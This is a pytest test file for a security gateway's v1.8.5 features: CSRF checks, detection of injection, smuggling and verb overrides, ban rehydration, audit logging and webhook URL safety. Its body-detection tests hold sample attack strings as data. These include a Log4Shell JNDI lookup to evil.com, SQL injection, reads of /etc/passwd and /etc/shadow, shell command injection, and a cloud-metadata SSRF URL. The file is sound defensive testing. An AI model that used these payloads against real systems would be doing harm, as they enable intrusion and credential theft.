"""
tests/test_v185_security.py — v1.8.5 security feature tests.

Covers:
  - CSRF cookie issuance and validation
  - Body always-RE (ungated critical injection patterns)
  - ip_state LRU eviction (_BoundedIpStateDict)
  - HTTP smuggling detection
  - Verb override detection
  - Ban rehydration
  - Audit log enqueueing
  - Webhook circuit breaker + queue
"""
import asyncio
import hashlib
import hmac
import json
import os
import sqlite3
import sys
import tempfile
import time
from collections import deque
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# ── env setup (mirrors conftest.py) ─────────────────────────────────────────
_TMP = tempfile.mkdtemp(prefix="appsecgw-v185-test-")
os.environ.setdefault("UPSTREAM",  "https://example.com")
os.environ.setdefault("ADMIN_KEY", "TEST-KEY-DO-NOT-USE")
os.environ.setdefault("DB_PATH",   os.path.join(_TMP, "antibot-v185.db"))

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(_HERE))


# ── helpers ──────────────────────────────────────────────────────────────────

def _fake_request(method="GET", headers=None, cookies=None, query=None):
    r = MagicMock()
    r.method = method
    r.headers = headers or {}
    r.cookies = cookies or {}
    r.query = query or {}
    r.remote = "1.2.3.4"
    _store = {}
    r.__getitem__ = lambda self, k: _store[k]
    r.__setitem__ = lambda self, k, v: _store.__setitem__(k, v)
    r.get = lambda k, d=None: _store.get(k, d)
    return r


# ─────────────────────────────────────────────────────────────────────────────
# 1. CSRF TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestCsrf:
    def _session_key(self):
        from config import SESSION_KEY
        return SESSION_KEY

    def _make_token(self, sid):
        return hmac.new(self._session_key(), sid.encode(), hashlib.sha256).hexdigest()[:32]

    def _make_session_cookie(self, username="admin", sid="testsid1234567890"):
        import base64 as _b64
        n = int(time.time())
        expiry = n + 43200
        payload = f"{username}|{sid}|{expiry}".encode("utf-8")
        sig = hmac.new(self._session_key(), payload, hashlib.sha256).digest()
        sig_b = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode("ascii")
        return f"{username}|{sid}|{expiry}|{sig_b}"

    def test_csrf_valid_token_accepted(self):
        from admin.auth import _csrf_token_valid
        sid = "testsid1234567890"
        token = self._make_token(sid)
        cookie = self._make_session_cookie(sid=sid)
        r = _fake_request(
            method="POST",
            headers={"X-CSRF-Token": token},
            cookies={"agw_session": cookie},
        )
        assert _csrf_token_valid(r) is True

    def test_csrf_wrong_token_rejected(self):
        from admin.auth import _csrf_token_valid
        sid = "testsid1234567890"
        cookie = self._make_session_cookie(sid=sid)
        r = _fake_request(
            method="POST",
            headers={"X-CSRF-Token": "wrongtoken" * 3},
            cookies={"agw_session": cookie},
        )
        assert _csrf_token_valid(r) is False

    def test_csrf_get_bypasses_check(self):
        from admin.auth import _csrf_token_valid
        r = _fake_request(method="GET", headers={}, cookies={})
        assert _csrf_token_valid(r) is True

    def test_csrf_missing_session_rejected(self):
        from admin.auth import _csrf_token_valid
        r = _fake_request(method="POST", headers={"X-CSRF-Token": "abc"}, cookies={})
        assert _csrf_token_valid(r) is False

    def test_csrf_cookie_set_on_login(self):
        """Verify that login_submit_endpoint sets agw_csrf cookie."""
        # We test via the cookie-set logic directly: parse the token, compute HMAC.
        from admin.users import _session_sign
        from config import SESSION_KEY
        sid = "mysessionid1234"
        token = _session_sign("admin", sid=sid)
        extracted_sid = token.split("|")[1]
        expected_csrf = hmac.new(SESSION_KEY, extracted_sid.encode(), hashlib.sha256).hexdigest()[:32]
        # Verify it's 32 hex chars
        assert len(expected_csrf) == 32
        assert all(c in "0123456789abcdef" for c in expected_csrf)


# ─────────────────────────────────────────────────────────────────────────────
# 2. BODY ALWAYS-RE TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestBodyAlwaysRe:
    def _check(self, body: bytes, ctype: str = "application/json") -> bool:
        from config import check_always_body
        return check_always_body(body, ctype)

    def test_body_always_union_select_fires_at_risk_zero(self):
        assert self._check(b'{"q": "1 UNION SELECT * FROM users"}') is True

    def test_body_always_log4shell_catches(self):
        assert self._check(b'{"msg": "${jndi:ldap://evil.com/a}"}') is True

    def test_body_always_metadata_ip(self):
        assert self._check(b'url=http://169.254.169.254/latest/meta-data',
                           "application/x-www-form-urlencoded") is True

    def test_body_always_false_for_normal(self):
        assert self._check(b'{"username": "alice", "action": "login"}') is False

    def test_body_always_content_type_gate(self):
        # image/png should be skipped
        assert self._check(b"UNION SELECT * FROM users", "image/png") is False

    def test_body_always_lfi_passwd(self):
        assert self._check(b'{"file": "/etc/passwd"}') is True

    def test_body_always_proc_self(self):
        assert self._check(b'file=/proc/self/environ',
                           "application/x-www-form-urlencoded") is True

    def test_body_always_cmd_injection(self):
        assert self._check(b'cmd=; cat /etc/shadow') is True

    def test_body_always_shell_binary(self):
        # The cmd-injection pattern covers shell invocations via ; | & ` prefixes
        assert self._check(b'cmd=foo; sh -c id') is True

    def test_body_always_url_encoded_union_select(self):
        from config import check_always_body
        body = b"q=1+UNION+SELECT+*+FROM+users"
        assert check_always_body(body, "application/x-www-form-urlencoded") is True


# ─────────────────────────────────────────────────────────────────────────────
# 3. IP_STATE EVICTION TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestBoundedIpStateDict:
    def _make_dict(self, maxsize=5):
        from state import _BoundedIpStateDict
        return _BoundedIpStateDict(maxsize=maxsize)

    def test_bounded_ip_state_defaultdict_behavior(self):
        d = self._make_dict(maxsize=10)
        s = d["10.0.0.1"]
        from state import IpState
        assert isinstance(s, IpState)

    def test_bounded_ip_state_lru_eviction(self):
        d = self._make_dict(maxsize=3)
        _ = d["a"].last_seen  # access to create
        _ = d["b"].last_seen
        _ = d["c"].last_seen
        # Adding a 4th should evict oldest (a)
        _ = d["d"].last_seen
        assert "a" not in d
        assert "b" in d
        assert "c" in d
        assert "d" in d

    def test_bounded_ip_state_access_promotes(self):
        d = self._make_dict(maxsize=3)
        _ = d["a"].last_seen
        _ = d["b"].last_seen
        _ = d["c"].last_seen
        # Access 'a' to promote it
        _ = d["a"]
        # Now add 'd' — should evict 'b' (oldest after 'a' was promoted)
        _ = d["d"].last_seen
        assert "a" in d
        assert "b" not in d

    def test_bounded_ip_state_evict_expired_ttl(self):
        d = self._make_dict(maxsize=100)
        from state import IpState
        # Create entries with stale last_seen
        s1 = IpState()
        s1.last_seen = time.monotonic() - 7200  # 2 h ago
        d["stale"] = s1
        s2 = IpState()
        s2.last_seen = time.monotonic()  # fresh
        d["fresh"] = s2
        evicted = d.evict_expired(ttl_secs=3600.0)
        assert evicted == 1
        assert "stale" not in d
        assert "fresh" in d

    def test_bounded_ip_state_len(self):
        d = self._make_dict(maxsize=10)
        for i in range(5):
            _ = d[str(i)].last_seen
        assert len(d) == 5

    def test_bounded_ip_state_get_returns_none_for_missing(self):
        d = self._make_dict()
        assert d.get("nonexistent") is None

    def test_bounded_ip_state_contains(self):
        d = self._make_dict()
        _ = d["x"]
        assert "x" in d
        assert "y" not in d


# ─────────────────────────────────────────────────────────────────────────────
# 4. SMUGGLING DETECTION TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestSmugglingDetection:
    def _check(self, headers: dict) -> "str | None":
        from config import check_smuggling
        r = _fake_request(headers=headers)
        return check_smuggling(r)

    def test_smuggling_dual_header(self):
        result = self._check({"content-length": "10", "transfer-encoding": "chunked"})
        assert result == "smuggling-dual-header"

    def test_smuggling_obfuscated_te(self):
        result = self._check({"transfer-encoding": "xchunked"})
        assert result == "smuggling-obfuscated-te"

    def test_smuggling_clean_request(self):
        result = self._check({"content-length": "10"})
        assert result is None

    def test_smuggling_chunked_only(self):
        result = self._check({"transfer-encoding": "chunked"})
        assert result is None

    def test_smuggling_invalid_te(self):
        result = self._check({"transfer-encoding": "bogusvalue"})
        assert result == "smuggling-invalid-te"

    def test_smuggling_identity_te_is_valid(self):
        result = self._check({"transfer-encoding": "identity"})
        assert result is None


# ─────────────────────────────────────────────────────────────────────────────
# 5. VERB OVERRIDE TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestVerbOverride:
    def _check(self, headers=None, query=None) -> bool:
        from config import check_verb_override
        r = _fake_request(headers=headers or {}, query=query or {})
        return check_verb_override(r)

    def test_verb_override_header_x_http_method_override(self):
        assert self._check(headers={"x-http-method-override": "DELETE"}) is True

    def test_verb_override_header_x_method_override(self):
        assert self._check(headers={"x-method-override": "PATCH"}) is True

    def test_verb_override_header_x_http_method(self):
        assert self._check(headers={"x-http-method": "PUT"}) is True

    def test_verb_override_query_param(self):
        assert self._check(query={"_method": "DELETE"}) is True

    def test_verb_override_clean(self):
        assert self._check(headers={"content-type": "application/json"}) is False

    def test_verb_override_method_header(self):
        assert self._check(headers={"_method": "DELETE"}) is True


# ─────────────────────────────────────────────────────────────────────────────
# 6. BAN REHYDRATION TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestBanRehydration:
    def _setup_db(self, db_path: str):
        conn = sqlite3.connect(db_path)
        conn.execute("""CREATE TABLE IF NOT EXISTS bans (
            ip TEXT PRIMARY KEY, banned_until REAL, reason TEXT, ts REAL
        )""")
        conn.commit()
        return conn

    def test_rehydrate_bans_loads_active_bans(self):
        import importlib
        db_path = os.path.join(_TMP, "rehydrate_test.db")
        conn = self._setup_db(db_path)
        future_ts = time.time() + 3600
        conn.execute("INSERT OR REPLACE INTO bans VALUES (?,?,?,?)",
                     ("10.10.10.1", future_ts, "test-ban", time.time()))
        conn.commit()
        conn.close()

        with patch("db.sqlite.DB_PATH", db_path):
            from state import _BoundedIpStateDict, IpState
            fake_ip_state = _BoundedIpStateDict(maxsize=1000)
            with patch("state.ip_state", fake_ip_state):
                from db.sqlite import _rehydrate_bans
                count = _rehydrate_bans()
        assert count == 1
        assert fake_ip_state["10.10.10.1"].banned_until == pytest.approx(future_ts, abs=1)

    def test_rehydrate_bans_ignores_expired(self):
        db_path = os.path.join(_TMP, "rehydrate_expired_test.db")
        conn = self._setup_db(db_path)
        past_ts = time.time() - 100
        conn.execute("INSERT OR REPLACE INTO bans VALUES (?,?,?,?)",
                     ("10.10.10.2", past_ts, "old-ban", time.time() - 200))
        conn.commit()
        conn.close()

        with patch("db.sqlite.DB_PATH", db_path):
            from state import _BoundedIpStateDict
            fake_ip_state = _BoundedIpStateDict(maxsize=1000)
            with patch("state.ip_state", fake_ip_state):
                from db.sqlite import _rehydrate_bans
                count = _rehydrate_bans()
        assert count == 0


# ─────────────────────────────────────────────────────────────────────────────
# 7. AUDIT LOG TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestAuditLog:
    def test_audit_log_enqueues_event(self):
        q = asyncio.Queue(maxsize=100)
        with patch("state.db_queue", q):
            from admin.audit import audit_log, EVT_LOGIN_SUCCESS
            audit_log(EVT_LOGIN_SUCCESS, actor="admin", ip="1.2.3.4")
        assert not q.empty()
        op, args = q.get_nowait()
        assert op == "audit_log"
        ts, event_type, actor, target, ip, detail_json, session_id, severity = args
        assert event_type == EVT_LOGIN_SUCCESS
        assert actor == "admin"
        assert ip == "1.2.3.4"
        assert severity == "info"

    def test_audit_log_event_types(self):
        from admin.audit import (
            audit_log,
            EVT_LOGIN_SUCCESS, EVT_LOGIN_FAILED, EVT_LOGOUT,
            EVT_USER_CREATED, EVT_USER_UPDATED, EVT_USER_DELETED,
            EVT_SESSION_REVOKED, EVT_CONFIG_CHANGED, EVT_BAN_MANUAL,
            EVT_CSRF_REJECTED,
        )
        all_events = [
            EVT_LOGIN_SUCCESS, EVT_LOGIN_FAILED, EVT_LOGOUT,
            EVT_USER_CREATED, EVT_USER_UPDATED, EVT_USER_DELETED,
            EVT_SESSION_REVOKED, EVT_CONFIG_CHANGED, EVT_BAN_MANUAL,
            EVT_CSRF_REJECTED,
        ]
        assert len(all_events) == 10
        q = asyncio.Queue(maxsize=20)
        with patch("state.db_queue", q):
            for evt in all_events:
                audit_log(evt, actor="tester")
        assert q.qsize() == 10

    def test_audit_log_no_queue_noop(self):
        with patch("state.db_queue", None):
            from admin.audit import audit_log, EVT_CONFIG_CHANGED
            # Should not raise
            audit_log(EVT_CONFIG_CHANGED, actor="admin")

    def test_audit_log_warn_severity_for_failed_login(self):
        q = asyncio.Queue(maxsize=10)
        with patch("state.db_queue", q):
            from admin.audit import audit_log, EVT_LOGIN_FAILED
            audit_log(EVT_LOGIN_FAILED, actor="attacker", ip="5.6.7.8")
        op, args = q.get_nowait()
        severity = args[7]
        assert severity == "warn"

    def test_audit_log_detail_serialized(self):
        q = asyncio.Queue(maxsize=10)
        with patch("state.db_queue", q):
            from admin.audit import audit_log, EVT_USER_UPDATED
            audit_log(EVT_USER_UPDATED, actor="admin", target="bob",
                      role="viewer", status="active")
        op, args = q.get_nowait()
        detail_json = args[5]
        detail = json.loads(detail_json)
        assert detail["role"] == "viewer"
        assert detail["status"] == "active"


# ─────────────────────────────────────────────────────────────────────────────
# 8. WEBHOOK TESTS
# ─────────────────────────────────────────────────────────────────────────────

class TestWebhook:
    def test_webhook_url_safe_blocks_private(self):
        from integrations.webhook import _webhook_url_safe
        assert _webhook_url_safe("http://192.168.1.1/hook") is False
        assert _webhook_url_safe("http://10.0.0.1/hook") is False
        assert _webhook_url_safe("http://127.0.0.1/hook") is False
        assert _webhook_url_safe("http://169.254.169.254/hook") is False

    def test_webhook_url_safe_allows_public(self):
        from integrations.webhook import _webhook_url_safe
        assert _webhook_url_safe("https://hooks.slack.com/services/T00/B00/xxx") is True

    def test_webhook_filter_drops_unsubscribed(self):
        from integrations.webhook import _webhook_event_allowed
        with patch("integrations.webhook.WEBHOOK_EVENT_FILTER", ["honeypot", "ban"]):
            assert _webhook_event_allowed({"reason": "honeypot"}) is True
            assert _webhook_event_allowed({"reason": "rate-limit"}) is False

    def test_webhook_filter_empty_allows_all(self):
        from integrations.webhook import _webhook_event_allowed
        with patch("integrations.webhook.WEBHOOK_EVENT_FILTER", []):
            assert _webhook_event_allowed({"reason": "anything"}) is True

    def test_webhook_queue_enqueues_event(self):
        """_post_webhook puts an event in _WEBHOOK_QUEUE when URL is safe."""
        import integrations.webhook as wh

        async def _run():
            wh._WEBHOOK_QUEUE = asyncio.Queue(maxsize=500)
            with patch.object(wh, "WEBHOOK_URL", "https://hooks.example.com/x"), \
                 patch.object(wh, "WEBHOOK_EVENT_FILTER", []), \
                 patch("integrations.redis._redis", None):
                await wh._post_webhook({"reason": "honeypot", "track_key": "abc"})
            return wh._WEBHOOK_QUEUE.qsize()

        size = asyncio.run(_run())
        assert size == 1

    def test_webhook_circuit_breaker_opens_after_failures(self):
        """After CB_THRESHOLD consecutive failures, _CB_OPEN_UNTIL is set in the future."""
        import integrations.webhook as wh
        import time as _time

        wh._CB_FAILURES = 0
        wh._CB_OPEN_UNTIL = 0.0
        wh._CB_THRESHOLD = 3
        wh._CB_RESET_SECS = 60.0
        baseline = _time.monotonic()
        for _ in range(3):
            wh._CB_FAILURES += 1
            if wh._CB_FAILURES >= wh._CB_THRESHOLD:
                wh._CB_OPEN_UNTIL = _time.monotonic() + wh._CB_RESET_SECS
        assert wh._CB_OPEN_UNTIL > baseline + 50

    def test_webhook_worker_skips_when_no_url(self):
        """_post_webhook with empty WEBHOOK_URL should not enqueue."""
        import integrations.webhook as wh
        prev_q = wh._WEBHOOK_QUEUE
        wh._WEBHOOK_QUEUE = asyncio.Queue(maxsize=10)
        try:
            with patch.object(wh, "WEBHOOK_URL", ""):
                # _post_webhook returns early without queueing when URL is empty
                loop = asyncio.new_event_loop()
                try:
                    loop.run_until_complete(
                        wh._post_webhook({"reason": "test"}))
                finally:
                    loop.close()
            assert wh._WEBHOOK_QUEUE.empty()
        finally:
            wh._WEBHOOK_QUEUE = prev_q

    def test_webhook_start_worker_creates_task(self):
        """start_webhook_worker sets _WEBHOOK_WORKER_TASK."""
        import integrations.webhook as wh
        prev = wh._WEBHOOK_WORKER_TASK

        async def _run():
            wh._WEBHOOK_WORKER_TASK = None
            await wh.start_webhook_worker()
            t = wh._WEBHOOK_WORKER_TASK
            assert t is not None
            assert not t.done()
            t.cancel()
            try:
                await t
            except asyncio.CancelledError:
                pass
            wh._WEBHOOK_WORKER_TASK = prev

        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(asyncio.wait_for(_run(), timeout=5))
        finally:
            loop.close()
